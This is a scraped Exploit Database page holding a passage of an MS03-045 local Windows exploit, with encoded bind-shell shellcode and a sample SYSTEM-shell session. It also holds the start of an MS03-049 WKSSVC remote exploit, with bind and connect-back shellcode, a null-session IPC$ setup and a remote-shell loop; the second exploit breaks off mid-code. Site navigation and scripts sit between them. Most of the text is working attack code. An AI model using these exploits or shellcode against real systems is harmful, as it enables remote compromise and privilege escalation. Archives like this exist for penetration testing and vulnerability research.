of this stuff!/		first of all you should figure out the handle\		addresses of ListBox/ComboBox & EDIT,RichEdit,etc/		(to store shellcode inside of it.. you can also\		store shellcode by diffrent way into variables of/		vuln program (i.e. through fopen(),argv,etc..)\/\	yesh yesh y0...check it out y0.../	wu-tang clan forever :)\/	greetzz to: tANDm :), Billi_k1d, alph4, btr, hhs, v1pee, ni69az,\		    akid, Joel Eriksson, andrewg, Amour and others.../\       tested on WinXP (also should work on others Win32)/\	p.s. use can find vuln program with SYSTEM privileges (antivirus,firewall,etc)/            to obtain the SYSTEM privileges\*//*\/	example of work:\	-----------------/\	vuln program:/\	C:\...ual Studio\MyProjects\vuln\Debug>vuln.exe/\/	C:\...ual Studio\MyProjects\vuln\Debug>\/\	-------/\	exploit:/\	C:\MSVCSTAFF\Debug>85boom.exe -t 0/\	[MS03-045 local exploit by xCrZx /11.11.03/]/\	Enter addresses of the program handles:/	<handle of Edit/RichEdit/etc (to store shellcode)> <handle of ListBox/ComboBox>\	(i.e. "00450ca1 0066345c") -> 1e01f6 2701a2/\	[+] Set shellcode!/	--> Using LB_DIR command\	--> Using return address = 0x1515/	[+] Set return addresses!\	[+] Sending shellcode message!/	[+] Sending exploit message! Try to connect on 1981 port after 5 sec!\/\	--------/\	Microsoft Telnet> open localhost 1981/\	.../\	Microsoft Windows XP [¥àá¨ï 5.1.2600]/	() ®à¯®à æ¨ï  ©ªà®á®äâ, 1985-2001.\/	C:\Program Files\Microsoft Visual Studio\MyProjects\vuln\Debug>\*/#include <windows.h>#include <stdio.h>#include <tchar.h>char shellcode[] =//bind on 1981"\xEB\x0F\x5B\x80\x33\x93\x43\x81\x3B\x45\x59\x34\x53\x75\xF4\x74""\x05\xE8\xEC\xFF\xFF\xFF"//sc_bind_1981 for 2k/xp/2003 by ey4s//speacial version for ws_ftp base on v1.03.10.07//XOR with 0x93 (367 0x16F bytes)"\x12\x7F\x93\x91\x93\x93\x7A\xA4\x92\x93\x93\xCC\xF7\x32\xA3\x93""\x93\x93\x18\xD3\x9F\x18\xE3\x8F\x3E\x18\xFB\x9B\xF9\x97\xCA\x7B""\x4A\x93\x93\x93\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC""\xC7\x6C\xC4\x6F\x18\x7B\xF9\x95\xCA\x7B\x2C\x93\x93\x93\x71\x6A""\x12\x7F\x03\x92\x93\x93\xC7\xFB\x91\x91\x93\x93\x6C\xC4\x7B\xC3""\xC3\xC3\xC3\xF9\x92\xF9\x91\x6C\xC4\x63\x18\x4B\x18\x7F\x54\xD6""\x93\x91\x93\x94\x2E\xA0\x53\x1A\xD6\x97\xF9\x83\xC6\xC0\x6C\xC4""\x67\xC0\xF9\x92\xC0\x6C\xC4\x6B\xC3\xC3\xC0\x6C\xC4\x6F\xC3\x10""\x7F\xCB\x18\x67\xA0\x48\xF9\x83\xCA\x1A\x8F\x1D\x71\x68\x78\xBF""\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3""\xD3\xD3\xD3\xD3\x03\x03\x03\x03\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3""\xE9\x35\xFF\xFF\xFF\xD3\xD3\xD3\xD3\xD3\xD3\xD3\x1A\xD5\xAB\x1A""\xD5\xAF\x1A\xD5\xD3\x54\xD5\xBF\x92\x92\x93\x93\x1E\xD5\xD7\xC3""\xC5\xC0\xC0\xC0\xF9\x92\xC0\xC0\x1E\xD5\xC7\x54\x93\xF0\xFE\xF7""\x93\xC3\xC0\x6C\xC4\x73\xA0\x53\xDB\xC3\x6C\xE5\xD7\x6C\xC4\x4F""\x10\x57\xCB\x6C\xC4\x7F\x6C\xC4\x7F\xC3\x6C\xC4\x4B\xC2\x18\xE6""\xAF\x18\xE7\xBD\xEB\x90\x66\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA""\xD2\x3E\x90\x56\xA0\x48\xA0\x41\x9C\x2D\x83\xA9\x45\xE7\x9B\x52""\x58\x88\x90\x49\xD3\x78\x7C\xA8\x8C\xE6\x76\xCD\x18\xCD\xB7\x90""\x4E\xF5\x18\x9F\xD8\x18\xCD\x8F\x90\x4E\x18\x97\x18\x90\x56\x38""\xCA\x50\x7B\x57\x6D\x6C\x6C\x7A\x28\x50\x3D\x27\xEE\x86\x0B\x58""\xD1\xE4\x2B\x4F\x4E\x89\xA0\xBE\x87\xC5\x3D\x55\xB8\x2E\xBD\x4D""\xC4\xE1\x37\xB7\x21\xA1\x93\x9D\xCE\x58\x4D\xE7\xB1\xF0\x5B"//decode end sign"\x45\x59\x34\x53";#define SIZE 60000int main(int argc, char **argv) {HWND target=(HWND)0x240302;HWND target2;char buf[SIZE+5];char b0000[30000];long ret=0x00001515;int trigger=0;printf("\n[MS03-045 local exploit by xCrZx /11.11.03/]\n\n");if(argc==1) {printf( "Usage: %s <-t N> [-r return address]\n\n""N targets (-t option):\n\n\t0 - LB_DIR\n\t1 - CB_DIR\n\n",argv[0]);exit(0);}for(int j=0;j<argc;j++) {if(strcmp(argv[j],"-t")==NULL) { trigger = atoi(argv[j+1]); }if(strcmp(argv[j],"-r")==NULL) { ret = strtoul(argv[j+1],0,16); }}printf("Enter addresses of the program handles:\n<handle of Edit/RichEdit/etc (to store shellcode)><handle of ListBox/ComboBox>\n(i.e. \"00450ca1 0066345c\") -> ");fflush(stdout);scanf("%x %x",&target2,&target);memset(buf,0x00,sizeof buf);memset(b0000,0x00,sizeof b0000);printf("\n[+] Set shellcode!\n");memset(b0000,0x90,sizeof(b0000)-strlen(shellcode)-1);memcpy(b0000+strlen(b0000),&shellcode,strlen(shellcode));printf("--> Using %s command\n",(trigger)?("CB_DIR"):("LB_DIR"));printf("--> Using return address = 0x%x\n",ret);printf("[+] Set return addresses!\n");for(int i=0;i<SIZE/4;i++)*(long *)&buf[strlen(buf)]=ret;printf("[+] Sending shellcode message!\n");SendMessage(target2,WM_SETTEXT,0,(LPARAM)b0000);printf("[+] Sending exploit message! Try to connect on 1981 port after 5 sec!\n");SendMessage(target , (trigger)?(CB_DIR):(LB_DIR) ,DDL_READWRITE | DDL_DIRECTORY | DDL_DRIVES ,(LPARAM)buf);return 0;}------------------------------------------------------------------------------------------------------------// zzz.cpp : Defines the entry point for the application.//#include "stdafx.h"#include <windows.h>LRESULT CALLBACK WndProc(HWND hwnd , UINT msg , WPARAM wp , LPARAM lp) {static HWND list;static HWND rich;switch (msg) {case WM_DESTROY:PostQuitMessage(0);return 0;case WM_CREATE:list = CreateWindow(TEXT("LISTBOX") , NULL ,WS_CHILD | WS_VISIBLE | LBS_STANDARD ,0 , 0 , 300 , 300 , hwnd , (HMENU)1 ,((LPCREATESTRUCT)(lp))->hInstance , NULL);rich = CreateWindow("EDIT",      // predefined classNULL,        // no window titleWS_CHILD | WS_VISIBLE | WS_VSCROLL |ES_LEFT | ES_MULTILINE | ES_AUTOVSCROLL,300, 300, 100, 100,  // set size in WM_SIZE messagehwnd,        // parent window(HMENU) 1,   // edit control ID(HINSTANCE) GetWindowLong(hwnd, GWL_HINSTANCE),NULL);return 0;}return DefWindowProc(hwnd , msg , wp , lp);}int WINAPI WinMain(HINSTANCE hInstance , HINSTANCE hPrevInstance ,PSTR lpCmdLine , int nCmdShow ) {HWND hwnd;MSG msg;WNDCLASS winc;winc.style		= CS_HREDRAW | CS_VREDRAW;winc.lpfnWndProc	= WndProc;winc.cbClsExtra	= winc.cbWndExtra	= 0;winc.hInstance		= hInstance;winc.hIcon		= LoadIcon(NULL , IDI_APPLICATION);winc.hCursor		= LoadCursor(NULL , IDC_ARROW);winc.hbrBackground	= (HBRUSH)GetStockObject(WHITE_BRUSH);winc.lpszMenuName	= NULL;winc.lpszClassName	= TEXT("KITTY");if (!RegisterClass(&winc)) return -1;hwnd = CreateWindow(TEXT("KITTY") , TEXT("Kitty on your lap") ,WS_OVERLAPPEDWINDOW | WS_VISIBLE ,CW_USEDEFAULT , CW_USEDEFAULT ,CW_USEDEFAULT , CW_USEDEFAULT ,NULL , NULL , hInstance , NULL);if (hwnd == NULL) return -1;while(GetMessage(&msg , NULL , 0 , 0)) {TranslateMessage(&msg);DispatchMessage(&msg);}return msg.wParam;}// milw0rm.com [2003-11-14]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 123
Microsoft Windows - Workstation Service WKSSVC Remote (MS03-049) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - Workstation Service WKSSVC Remote (MS03-049)EDB-ID:123CVE:2003-0812EDB Verified:Author:snooqType:remoteExploit:/Platform:WindowsDate:2003-11-14Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**  Author: snooq*  Date: 14 November 2003**  +++++++++++++ THIS IS A PRIVATE VERSION +++++++++++++++**  This is just slightly better than the one I posted to*  packetstorm....**  The public version will crash 'services.exe' immediately*  while this one crash it only when u exit from shell....**  I'm still trying to figure out a way to avoid the 'crash'*  all together... any ideas????**  Let me know if you hav trouble compiling this shit...*  I hope this could be a good e.g for u to try Win32*  exploitation..**  This code is crappy... if u know of a better way of doing*  things... pls tell me.......**  Otherwise, if you guys r keen... I'll be more than happy*  to go thru this in details wif u all... Meanwhile..enjoy!**  +++++++++++++++++++++++++++++++++++++++++++++++++*/#pragma comment (linker,"/NODEFAULTLIB:msvcprtd.lib")#pragma comment (linker,"/NODEFAULTLIB:libcmtd.lib")#pragma comment (linker,"/NODEFAULTLIB:libcmt.lib")#pragma comment (linker,"/NODEFAULTLIB:libcd.lib")#pragma comment (lib,"ws2_32")#pragma comment (lib,"msvcrt")#pragma comment (lib,"mpr")#pragma warning (disable:4013)#include <winsock2.h>#include <windows.h>#include <process.h>#include <stdlib.h>#include <stdio.h>#include <lm.h>#define NOP	0x90#define PORT	24876#define KEY	0x99999999#define ALIGN		1	// Between 0 ~ 3#define TARGET		1#define INTERVAL	3#define TIME_OUT	20#define PORT_OFFSET_1	198#define PORT_OFFSET_2	193#define IP_OFFSET	186#define SC_OFFSET	20	// Gap for some NOPs...#define RET_SIZE	2026	// Big enuff to take EIP... ;)#define SC_SIZE_1	sizeof(bindport)#define SC_SIZE_2	sizeof(connback)#define BSIZE	2600#define SSIZE	128extern char getopt(int,char **,char*);extern char *optarg;static int alarm_fired=0;HMODULE hMod;FARPROC fxn;HANDLE t1, t2;char buff[BSIZE];struct {char *os;long jmpesp;char *dll;}targets[] = {{"Window 2000 (en) SP4",0x77e14c29,"user32.dll 5.0.2195.6688"},{"Window 2000 (en) SP1",0x77e3cb4c,"user32.dll 5.0.2195.1600"},{"For debugging only",0x41424344,"dummy.dll 5.0.2195.1600"}}, v;/** HD Moore's shellcode..... ;)*/char bindport[]="\xeb\x19\x5e\x31\xc9\x81\xe9\xa6\xff\xff\xff\x81\x36\x99\x99\x99""\x99\x81\xee\xfc\xff\xff\xff\xe2\xf2\xeb\x05\xe8\xe2\xff\xff\xff""\x71\xa1\x99\x99\x99\xda\xd4\xdd\x99\x7e\xe0\x5f\xe0\x7c\xd0\x1f""\xd0\x3d\x34\xb7\x70\x3d\x83\xe9\x5e\x40\x90\x6c\x34\x52\x74\x65""\xa2\x17\xd7\x97\x75\xe7\x41\x7b\xea\x34\x40\x9c\x57\xeb\x67\x2a""\x8f\xce\xca\xab\xc6\xaa\xab\xb7\xdd\xd5\xd5\x99\x98\xc2\xcd\x10""\x7c\x10\xc4\x99\xf3\xa9\xc0\xfd\x12\x98\x12\xd9\x95\x12\xe9\x85""\x34\x12\xc1\x91\x72\x95\x14\xce\xb5\xc8\xcb\x66\x49\x10\x5a\xc0""\x72\x89\xf3\x91\xc7\x98\x77\xf3\x93\xc0\x12\xe4\x99\x19\x60\x9f""\xed\x7d\xc8\xca\x66\xad\x16\x71\x09\x99\x99\x99\xc0\x10\x9d\x17""\x7b\x72\xa8\x66\xff\x18\x75\x09\x98\xcd\xf1\x98\x98\x99\x99\x66""\xcc\xb9\xce\xce\xce\xce\xde\xce\xde\xce\x66\xcc\x85\x10\x5a\xa8""\x66\xce\xce\xf1\x9b\x99\xf8\xb5\x10\x7f\xf3\x89\xcf\xca\x66\xcc""\x81\xce\xca\x66\xcc\x8d\xce\xcf\xca\x66\xcc\x89\x10\x5b\xff\x18""\x75\xcd\x99\x14\xa5\xbd\xa8\x59\xf3\x8c\xc0\x6a\x32\x10\x4e\x5f""\xdd\xbd\x89\xdd\x67\xdd\xbd\xa4\x10\xe5\xbd\xd1\x10\xe5\xbd\xd5""\x10\xe5\xbd\xc9\x14\xdd\xbd\x89\xcd\xc9\xc8\xc8\xc8\xd8\xc8\xd0""\xc8\xc8\x66\xec\x99\xc8\x66\xcc\xa9\x10\x78\xf1\x66\x66\x66\x66""\x66\xa8\x66\xcc\xb5\xce\x66\xcc\x95\x66\xcc\xb1\xca\xcc\xcf\xce""\x12\xf5\xbd\x81\x12\xdc\xa5\x12\xcd\x9c\xe1\x98\x73\x12\xd3\x81""\x12\xc3\xb9\x98\x72\x7a\xab\xd0\x12\xad\x12\x98\x77\xa8\x66\x65""\xa8\x59\x35\xa1\x79\xed\x9e\x58\x56\x94\x98\x5e\x72\x6b\xa2\xe5""\xbd\x8d\xec\x78\x12\xc3\xbd\x98\x72\xff\x12\x95\xd2\x12\xc3\x85""\x98\x72\x12\x9d\x12\x98\x71\x72\x9b\xa8\x59\x10\x73\xc6\xc7\xc4""\xc2\x5b\x91\x99";char connback[]="\xeb\x19\x5e\x31\xc9\x81\xe9\xab\xff\xff\xff\x81\x36\x99\x99\x99""\x99\x81\xee\xfc\xff\xff\xff\xe2\xf2\xeb\x05\xe8\xe2\xff\xff\xff""\x71\xa9\x99\x99\x99\xda\xd4\xdd\x99\x7e\xe0\x5f\xe0\x75\x60\x33""\xf9\x40\x90\x6c\x34\x52\x74\x65\xa2\x17\xd7\x97\x75\xe7\x41\x7b""\xea\x34\x40\x9c\x57\xeb\x67\x2a\x8f\xce\xca\xab\xc6\xaa\xab\xb7""\xdd\xd5\xd5\x99\x98\xc2\xcd\x10\x7c\x10\xc4\x99\xf3\xa9\xc0\xfd""\x12\x98\x12\xd9\x95\x12\xe9\x85\x34\x12\xc1\x91\x72\x95\x14\xce""\xbd\xc8\xcb\x66\x49\x10\x5a\xc0\x72\x89\xf3\x91\xc7\x98\x77\xf3""\x91\xc0\x12\xe4\x99\x19\x60\x9d\xed\x7d\xc8\xca\x66\xad\x16\x71""\x1a\x99\x99\x99\xc0\x10\x9d\x17\x7b\x72\xa8\x66\xff\x18\x75\x09""\x98\xcd\xf1\x98\x98\x99\x99\x66\xcc\x81\xce\xce\xce\xce\xde\xce""\xde\xce\x66\xcc\x8d\x10\x5a\xa8\x66\xf1\x59\x31\x91\xa0\xf1\x9b""\x99\xf8\xb5\x10\x78\xf3\x89\xc8\xca\x66\xcc\x89\x1c\x59\xec\xdd""\x14\xa5\xbd\xa8\x59\xf3\x8c\xc0\x6a\x32\x5f\xdd\xbd\x89\xdd\x67""\xdd\xbd\xa4\x10\xc5\xbd\xd1\x10\xc5\xbd\xd5\x10\xc5\xbd\xc9\x14""\xdd\xbd\x89\xcd\xc9\xc8\xc8\xc8\xd8\xc8\xd0\xc8\xc8\x66\xec\x99""\xc8\x66\xcc\xb1\x10\x78\xf1\x66\x66\x66\x66\x66\xa8\x66\xcc\xbd""\xce\x66\xcc\x95\x66\xcc\xb9\xca\xcc\xcf\xce\x12\xf5\xbd\x81\x12""\xdc\xa5\x12\xcd\x9c\xe1\x98\x73\x12\xd3\x81\x12\xc3\xb9\x98\x72""\x7a\xab\xd0\x12\xad\x12\x98\x77\xa8\x66\x65\xa8\x59\x35\xa1\x79""\xed\x9e\x58\x56\x94\x98\x5e\x72\x6b\xa2\xe5\xbd\x8d\xec\x78\x12""\xc3\xbd\x98\x72\xff\x12\x95\xd2\x12\xc3\x85\x98\x72\x12\x9d\x12""\x98\x71\x72\x9b\xa8\x59\x10\x73\xc6\xc7\xc4\xc2\x5b\x91\x99\x09";void err_exit(char *s) {printf("%s\n",s);exit(0);}/** Ripped from TESO code and modifed by ey4s for win32* and... lamer quoted it wholesale here..... =p*/void doshell(int sock) {int l;char buf[512];struct timeval time;unsigned long ul[2];time.tv_sec=1;time.tv_usec=0;while (1) {ul[0]=1;ul[1]=sock;l=select(0,(fd_set *)&ul,NULL,NULL,&time);if(l==1) {l=recv(sock,buf,sizeof(buf),0);if (l<=0) {err_exit("-> Connection closed...\n");}l=write(1,buf,l);if (l<=0) {err_exit("-> Connection closed...\n");}}else {l=read(0,buf,sizeof(buf));if (l<=0) {err_exit("-> Connection closed...\n");}l=send(sock,buf,l,0);if (l<=0) {err_exit("-> Connection closed...\n");}}}}void changeip(char *ip) {char *ptr;ptr=connback+IP_OFFSET;/* Assume Little-Endianess.... */*((long *)ptr)=inet_addr(ip)^KEY;}void changeport(char *code, int port, int offset) {char *ptr;ptr=code+offset;port^=KEY;/* Assume Little-Endianess.... */*ptr++=(char)((port>>8)&0xff);*ptr++=(char)(port&0xff);}void banner() {printf("\nWKSSVC Remote Exploit By Snooq [jinyean@hotmail.com]\n\n");}void usage(char *s) {banner();printf("Usage: %s [options]\n",s);printf("\t-r\tSize of 'return addresses'\n");printf("\t-a\tAlignment size [0~3]\n");printf("\t-p\tPort to bind shell to (in 'connecting' mode), or\n");printf("\t\tPort for shell to connect back (in 'listening' mode)\n");printf("\t-s\tShellcode offset from the return address\n");printf("\t-h\tTarget's IP\n");printf("\t-t\tTarget types. ( -H for more info )\n");printf("\t-H\tShow list of possible targets\n");printf("\t-l\tListening for shell connecting\n");printf("\t\tback to port specified by '-p' switch\n");printf("\t-i\tIP for shell to connect back\n");printf("\t-I\tTime interval between each trial ('connecting' mode only)\n");printf("\t-T\tTime out (in number of seconds)\n\n");printf("\tNotes:\n\t======\n\t'-h' is mandatory\n");printf("\t'-i' is mandatory if '-l' is specified\n\n");exit(0);}void showtargets() {int i;banner();printf("Possible targets are:\n");printf("=====================\n");for (i=0;i<sizeof(targets)/sizeof(v);i++) {printf("%d) %s",i+1,targets[i].os);printf(" --> 0x%08x (%s)\n",targets[i].jmpesp,targets[i].dll);}exit(0);}void sendstr(char *host) {WCHAR wStr[128];char ipc[128], hStr[128];DWORD ret;NETRESOURCE NET;hMod=LoadLibrary("netapi32.dll");fxn=GetProcAddress(hMod,"NetValidateName");_snprintf(ipc,127,"\\\\%s\\ipc$",host);_snprintf(hStr,127,"\\\\%s",host);MultiByteToWideChar(CP_ACP,0,hStr,strlen(hStr)+1,wStr,sizeof(wStr)/sizeof(wStr[0]));NET.lpLocalName = NULL;NET.lpProvider = NULL;NET.dwType = RESOURCETYPE_ANY;NET.lpRemoteName = (char*)&ipc;printf("-> Setting up $IPC session...(aka 'null session')\n");ret=WNetAddConnection2(&NET,"","",0);if (ret!=ERROR_SUCCESS) { err_exit("-> Couldn't establish IPC$ connection..."); }else printf("-> IPC$ session setup successfully...\n");printf("-> Sending exploit string...\n");ret=fxn((LPCWSTR)wStr,buff,NULL,NULL,0);}VOID CALLBACK alrm_bell(HWND hwnd, UINT uMsg, UINT idEvent, DWORD dwTime ) {err_exit("-> I give up...dude.....");}void setalarm(int timeout) {MSG msg = { 0, 0, 0, 0 };SetTimer(0, 0, (timeout*1000), (TIMERPROC)alrm_bell);while(!alarm_fired) {if (GetMessage(&msg, 0, 0, 0) ) {if (msg.message == WM_TIMER) printf("-> WM_TIMER received...\n");DispatchMessage(&msg);}}}void resetalarm() {if (TerminateThread(t2,0)==0) {err_exit("-> Failed to reset alarm...");}if (TerminateThread(t1,0)==0) {err_exit("-> Failed to kill the 'sending' thread...");}}void do_send(char *host,int timeout) {t1=(HANDLE)_beginthread(sendstr,0,host);if (t1==0) { err_exit("-> Failed to send exploit string..."); }t2=(HANDLE)_beginthread(setalarm,0,timeout);if (t2==0) { err_exit("-> Failed to set alarm clock..."); }}int main(int argc, char *argv[]) {char opt;char *host, *ptr, *ip="";struct sockaddr_in sockadd;int i, i_len, ok=0, mode=0, flag=0;int align=ALIGN, retsize=RET_SIZE, sc_offset=SC_OFFSET;int target=TARGET, scsize=SC_SIZE_1, port=PORT;int timeout=TIME_OUT, interval=INTERVAL;long retaddr;WSADATA wsd;SOCKET s1, s2;if (argc<2) { usage(argv[0]); }while ((opt=getopt(argc,argv,"a:i:I:r:s:h:t:T:p:Hl"))!=EOF) {switch(opt) {case 'a':align=atoi(optarg);break;case 'I':interval=atoi(optarg);break;case 'T':timeout=atoi(optarg);break;case 't':target=atoi(optarg);retaddr=targets[target-1].jmpesp;break;case 'i':ip=optarg;changeip(ip);break;case 'l':mode=1;scsize=SC_SIZE_2;break;case 'r':retsize=atoi(optarg);break;case 's':sc_offset=atoi(optarg);break;case 'h':ok=1;host=optarg;sockadd.sin_addr.s_addr=inet_addr(optarg);break;case 'p':port=atoi(optarg);break;case 'H':showtargets();break;default:usage(argv[0]);break;}}if (!ok || (mode&&((strcmp(ip,"")==0)))) { usage(argv[0]); }memset(buff,NOP,BSIZE);ptr=buff+align;for(i=0;i<retsize;i+=4) {*((long *)ptr)=retaddr;ptr+=4;}if (WSAStartup(MAKEWORD(1,1),&wsd)!=0) {err_exit("-> WSAStartup error....");}if ((s1=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {err_exit("-> socket() error...");}sockadd.sin_family=AF_INET;sockadd.sin_port=htons((SHORT)port);ptr=buff+retsize+sc_offset;if (BSIZE<(retsize+sc_offset+scsize)) err_exit("-> Bad 'sc_offset'..");banner();if (mode) {printf("-> 'Listening' mode...( port: %d )\n",port);changeport(connback, port, 